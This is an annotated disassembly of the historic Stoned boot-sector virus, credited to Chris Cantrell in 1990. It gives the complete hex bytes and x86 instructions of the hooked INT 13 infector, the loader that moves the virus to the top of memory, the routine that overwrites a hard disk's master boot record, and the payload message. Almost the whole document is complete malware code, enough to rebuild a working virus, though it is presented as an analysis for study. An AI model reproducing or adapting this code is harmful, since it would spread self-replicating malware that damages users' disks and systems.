STONED PC COMPUTER VIRUS
Disassembled by Chris Cantrell 1990

;##-
;##Menu 3 "Stoned Code"
;##MenuLink Start            "Entry point"
;##MenuLink Infector         "Disk infector"
;##MenuLink Loader           "Loader"
;##MenuLink StonedMessage    "The 'Stoned' Message"
;##MenuLink Extra            "Extra message on the end"
;##-

;##Start
; This jump is checked by the ROM to verify that a valid boot sector is present.
0000: EA 05 00 C0 07    JMP     07C0:0005               ; *1 07C0 is where the boot sector is
                                                        ; loaded. Jump to next instruction.               
                                                        ; (Re-orient the CS along the way)

0005: E9 99 00          JMP     00A1                    ; *2 Jump over data area

0008: 00                ; Media source. 0 if loaded from a floppy, 2 from a fixed disk.
;     Offs Seg
0009: 00 00 00 00       ; Original INT 13 vector
000D: E4 00 00 00       ; Resident virus location in memory      (used for easy JMP)
0011: 00 7C 00 00       ; Pointer to original boot sector memory (used for easy JMP)

;##Infector
;-----------------------------------------------------------------
; Infector
;-----------------------------------------------------------------
; New INT 13 handler
0015: 1E                PUSH    DS                      ; Hold ...
0016: 50                PUSH    AX                      ; ... incoming parameters
0017: 80 FC 02          CMP     AH,02                   ; Is this a READ SECTOR request?
001A: 72 17             JB      0033                    ; Ingore all requests ...
001C: 80 FC 04          CMP     AH,04                   ; ... except ...
001F: 73 12             JNB     0033                    ; ... READ = 2 or WRITE = 3 ...
0021: 0A D2             OR      DL,DL                   ; ... to drive 0 ...
0023: 75 0E             JNZ     0033                    ; ... (floppy)
0025: 33 C0             XOR     AX,AX                   ; Set the DS register ...
0027: 8E D8             MOV     DS,AX                   ; ... to 0000
; The first sector in a group written to disk starts the drive motor. This check is a way
; for the virus to check the boot sector only on the first sector in a group and not
; on every sector which would bring the disk access to a crawl.
0029: A0 3F 04          MOV     AL,[DS:043F]            ; Check to see if drive motor is ...
002C: A8 01             TEST    AL,01                   ; ... already turned on.
002E: 75 03             JNZ     0033                    ; Yes ... don't do anything
0030: E8 07 00          CALL    003A                    ; Do any viral infection
0033: 58                POP     AX                      ; Restore original ...
0034: 1F                POP     DS                      ; ... incoming parameters
0035: 2E FF 2E 09 00    JMP     FAR [CS:0009]           ; Execute the original INT 13
;
; Try to infect Drive A
;
003A: 53                PUSH    BX                      ; Save all ...
003B: 51                PUSH    CX                      ; ...
003C: 52                PUSH    DX                      ; ...
003D: 06                PUSH    ES                      ; ...
003E: 56                PUSH    SI                      ; ...
003F: 57                PUSH    DI                      ; ... registers
0040: BE 04 00          MOV     SI,0004                 ; 4 attemps at reading (motor warm up)
0043: B8 01 02          MOV     AX,0201                 ; Read one sector
0046: 0E                PUSH    CS                      ; Set ES to point ...
0047: 07                POP     ES                      ; ... to code segment
0048: BB 00 02          MOV     BX,0200                 ; Just past the virus in memory
004B: 33 C9             XOR     CX,CX                   ; Cyl 0, Sect 1 (shortly)
004D: 89 CA             MOV     DX,CX                   ; Head 0, Drive 0
004F: 41                INC     CX                      ; Now Cyl 1
0050: 9C                PUSHF                           ; *4 Set stack as if an interrupt
0051: 2E FF 1E 09 00    CALL    FAR [CS:0009]           ; Read boot sector with INT 13
0056: 73 0E             JNB     0066                    ; Got it ... move on.
0058: 33 C0             XOR     AX,AX                   ; Reset drive command
005A: 9C                PUSHF                           ; Set stack as if an interrupt
005B: 2E FF 1E 09 00    CALL    FAR [CS:0009]           ; Reset drive with INT 13
0060: 4E                DEC     SI                      ; All attempts tried?
0061: 75 E0             JNZ     0043                    ; No ... keep trying
0063: EB 35 90          JMP     009A                    ; Couldn't do it ... out
;
; At this point the drive is responding - load the boot sector into virus memory segment
; and check if it has been infected.
0066: 33 F6             XOR     SI,SI                   ; Virus starting point
0068: BF 00 02          MOV     DI,0200                 ; Just read boot sector
006B: FC                CLD                             ; Moving forward
006C: 0E                PUSH    CS                      ; Set DS to ...
006D: 1F                POP     DS                      ; ... code segment
006E: AD                LODSW                           ; First word of virus
006F: 3B 05             CMP     AX,[DI]                 ; Looks the same as boot sector?
0071: 75 06             JNZ     0079                    ; No ... we need to infect
0073: AD                LODSW                           ; Compare second words to be sure
0074: 3B 45 02          CMP     AX,[DI+02]              ; Looks the same?
0077: 74 21             JZ      009A                    ; Yes ... already infected
;
; Boot sector is not infected - move original into FAT table and write virus to boot sector.
0079: B8 01 03          MOV     AX,0301                 ; Write one sector
007C: BB 00 02          MOV     BX,0200                 ; Point to original boot
007F: B1 03             MOV     CL,03                   ; *5 Cyl 0, Sec 3
0081: B6 01             MOV     DH,01                   ; Head 1, Drive 0
0083: 9C                PUSHF                           ; Set stack as if an interrupt
0084: 2E FF 1E 09 00    CALL    [CS:0009]               ; Hold original boot sector
0089: 72 0F             JB      009A                    ; Error ... out of here
008B: B8 01 03          MOV     AX,0301                 ; Write one sector
008E: 33 DB             XOR     BX,BX                   ; At offset 0
0090: B1 01             MOV     CL,01                   ; Sector 1
0092: 33 D2             XOR     DX,DX                   ; Drive head 0
0094: 9C                PUSHF                           ; As if an interrupt
0095: 2E FF 1E 09 00    CALL    FAR [CS:0009]           ; Write virus to normal boot entry
;
; Restore original parameters to INT 13 request and do original INT 13.
009A: 5F                POP     DI                      ; Restore all ...
009B: 5E                POP     SI                      ; ...
009C: 07                POP     ES                      ; ...
009D: 5A                POP     DX                      ; ...
009E: 59                POP     CX                      ; ...
009F: 5B                POP     BX                      ; ... Registers
00A0: C3                RET                             ; Done
;-----------------------------------------------------------------

;##Loader
;-----------------------------------------------------------------
; Loader
;-----------------------------------------------------------------
; Executes on bootup
00A1: 33 C0             XOR     AX,AX                   ; Set DS to ...
00A3: 8E D8             MOV     DS,AX                   ; ... system segment
00A5: FA                CLI                             ; No interrupts through here
00A6: 8E D0             MOV     SS,AX                   ; Set a temporary ...
00A8: BC 00 7C          MOV     SP,7C00                 ; ... stack 
00AB: FB                STI                             ; Interrupts can happen now
00AC: A1 4C 00          MOV     AX,[DS:004C]            ; Save ...
00AF: A3 09 7C          MOV     [DS:7C09],AX            ; ... original ...
00B2: A1 4E 00          MOV     AX,[DS:004E]            ; ... INT 13 ...
00B5: A3 0B 7C          MOV     [DS:7C0B],AX            ; ... vector.
00B8: A1 13 04          MOV     AX,[DS:0413]            ; *6 Number of K bytes in free memory
00BB: 48                DEC     AX                      ; Reserve ...
00BC: 48                DEC     AX                      ; ... 2K for virus (and buffer)
00BD: A3 13 04          MOV     [DS:0413],AX            ; New number of available K bytes
00C0: B1 06             MOV     CL,06                   ; Convert K byte number ...
00C2: D3 E0             SHL     AX,CL                   ; ... to segment address
00C4: 8E C0             MOV     ES,AX                   ; MOVSB destination: virus segment
00C6: A3 0F 7C          MOV     [DS:7C0F],AX            ; Store virus segment in our area
00C9: B8 15 00          MOV     AX,0015                 ; Offset to new INT13 handle
00CC: A3 4C 00          MOV     [DS:004C],AX            ; New INT13 offset ...
00CF: 8C 06 4E 00       MOV     [DS:004E],ES            ; ... and segment
00D3: B9 B8 01          MOV     CX,01B8                 ; Bytes in virus
00D6: 0E                PUSH    CS                      ; DS points to ...
00D7: 1F                POP     DS                      ; ... segment with virus code
00D8: 33 F6             XOR     SI,SI                   ; Offsets are both ...
00DA: 8B FE             MOV     DI,SI                   ; ... zero
00DC: FC                CLD                             ; Moving forward
00DD: F3 A4             REPZ    MOVSB                   ; Move virus into top of memroy
00DF: 2E FF 2E 0D 00    JMP     FAR [CS:000D]           ; Continue with next instruction in
                                                        ; new segment.
;
; At this point virus is running in its new 2K home at the end of RAM.
00E4: B8 00 00          MOV     AX,0000                 ; Reset disk system (prepare for IO)
00E7: CD 13             INT     13                      ; Disk now ready
00E9: 33 C0             XOR     AX,AX                   ; Set ES to ...
00EB: 8E C0             MOV     ES,AX                   ; ... system segment
00ED: B8 01 02          MOV     AX,0201                 ; Read 1 sector
00F0: BB 00 7C          MOV     BX,7C00                 ; Read location = normal boot buffer
00F3: 2E803E0800 00     CMP     BYTE PTR [CS:0008],00   ; *7 Are we booting from a hard-disk?
00F9: 74 0B             JZ      0106                    ; No ... use floppy hold sector
00FB: B9 07 00          MOV     CX,0007                 ; Cyl 0, Sec 7
00FE: BA 80 00          MOV     DX,0080                 ; Head 0, Drive 80
0101: CD 13             INT     13                      ; Read original boot from storage
0103: EB 49 90          JMP     014E                    ; Continue with normal boot
;
; We are booting up from a floppy - have a look at any local fixed-disks.
0106: B9 03 00          MOV     CX,0003                 ; Cyl 0, Sec 3 
0109: BA 00 01          MOV     DX,0100                 ; Head 1, Drive 0
010C: CD 13             INT     13                      ; Load the original boot sector
010E: 72 3E             JB      014E                    ; Error -- nothing we can do!
0110: 26F6066C0407      TEST    BYTE PTR [ES:046C],07   ; *8 Low byte of timer (random)
0116: 75 12             JNZ     012A                    ; Skip over 7/8 of the time
;
; 1 out of every 8 infected hard drives will see this message at the boot up where
; they are infected.
0118: BE 89 01          MOV     SI,0189                 ; Message
011B: 0E                PUSH    CS                      ; Set DS ...
011C: 1F                POP     DS                      ; ... to virus segment
011D: AC                LODSB                           ; Get byte in message
011E: 0A C0             OR      AL,AL                   ; Last loaded?
0120: 74 08             JZ      012A                    ; Yes ... done with message
0122: B4 0E             MOV     AH,0E                   ; Teletype mode
0124: B7 00             MOV     BH,00                   ; Base of screen
0126: CD 10             INT     10                      ; Print character
0128: EB F3             JMP     011D                    ; Do all characters
;
012A: 0E                PUSH    CS                      ; Set ES ...
012B: 07                POP     ES                      ; ... to CS
012C: B8 01 02          MOV     AX,0201                 ; Read current boot from C:
012F: BB 00 02          MOV     BX,0200                 ; Buffer after virus
0132: B1 01             MOV     CL,01                   ; Cyl = 0 (still), Sec = 1
0134: BA 80 00          MOV     DX,0080                 ; Head = 0, Drive = 80
0137: CD 13             INT     13                      ; Read current boot sector
0139: 72 13             JB      014E                    ; Error ... skip it
013B: 0E                PUSH    CS                      ; Set DS ...
013C: 1F                POP     DS                      ; ... to CS
013D: BE 00 02          MOV     SI,0200                 ; Current boot sector data
0140: BF 00 00          MOV     DI,0000                 ; Virus data
0143: AD                LODSW                           ; Get first word of boot sector
0144: 3B 05             CMP     AX,[DI]                 ; Same as virus?
0146: 75 11             JNZ     0159                    ; No ... infect it
0148: AD                LODSW                           ; Yes ... try second word
0149: 3B 45 02          CMP     AX,[DI+02]              ; Boot sector looks like virus?
014C: 75 0B             JNZ     0159                    ; No ... infect it
;
; No matter how virus loaded, it infects only floppy disks that get a copy of the
; memory-resident copy of the virus. We want floppies to have media type = 0.
014E: 2EC606080000      MOV     BYTE PTR [CS:0008],0    ; Media type = floppy.
0154: 2E FF 2E 11 00    JMP     [CS:0011]               ; Continue with normal boot sector
;
; Infect hard-drive
0159: 2EC606080002      MOV     BYTE PTR [CS:0008],2    ; Store virus on C: with flag set
015F: B8 01 03          MOV     AX,0301                 ; Write 1 sector
0162: BB 00 02          MOV     BX,0200                 ; Original boot sector
0165: B9 07 00          MOV     CX,0007                 ; Cyl = 0, Sec = 7
0168: BA 80 00          MOV     DX,0080                 ; Head = 0, Drive = 80
016B: CD 13             INT     13                      ; Store original boot in FAT
016D: 72 DF             JB      014E                    ; Error ... out of here
;
; Floppies are assumed to have 512 byte sectors (0200 hex) which is just barely
; room for the virus. Fixed disks are assumed to have twice that - 1K sectors (0400).
; The last 512 bytes of a fixed-disk boot record contain four partition descriptors.
; These descriptors describe the partitions and must be present in the infected
; sector - this code copies the descriptors into the virus sector buffer before writing
; it to disk.
016F: 0E                PUSH    CS                      ; Set DS ...
0170: 1F                POP     DS                      ; ... to CS
0171: 0E                PUSH    CS                      ; Set ES ...
0172: 07                POP     ES                      ; ... to CS
0173: BE BE 03          MOV     SI,03BE                 ; Copy partition ...
0176: BF BE 01          MOV     DI,01BE                 ; ... descriptors ...
0179: B9 42 02          MOV     CX,0242                 ; ... into ...
017C: F3 A4             REPZ    MOVSB                   ; ... virus sector buffer.
017E: B8 01 03          MOV     AX,0301                 ; Write one sector
0181: 33 DB             XOR     BX,BX                   ; Offset 0
0183: FE C1             INC     CL                      ; Cyl = 0, Sec = 1
0185: CD 13             INT     13                      ; Write infected boot sector
0187: EB C5             JMP     014E                    ; Continue with normal boot sector
;##StonedMessage
; 07,'Your PC is now STONED!',07,0dh,0ah,0ah,00
0189: 07 59 6F 75         
018D: 72 20 50            
0190: 43 20 69               
0193: 73 20 6E             
0196: 6F                    
0197: 77 20 53              
019A: 54 4F 4E               
019D: 45                     
019E: 44 21 07              
01A1: 0D 0A 0A 00             

;##Extra
; This is part of the virus but is never printed on the screen (notice no CR/LF on the end)
; 'LEGALISE MARIJUANA!'
01A5: 4C 45 47 41           
01A9: 4C 49 53             
01AC: 45 20 4D 41           
01B0: 52 49 4A             
01B3: 55 41 4E 41 21    
01B8:
      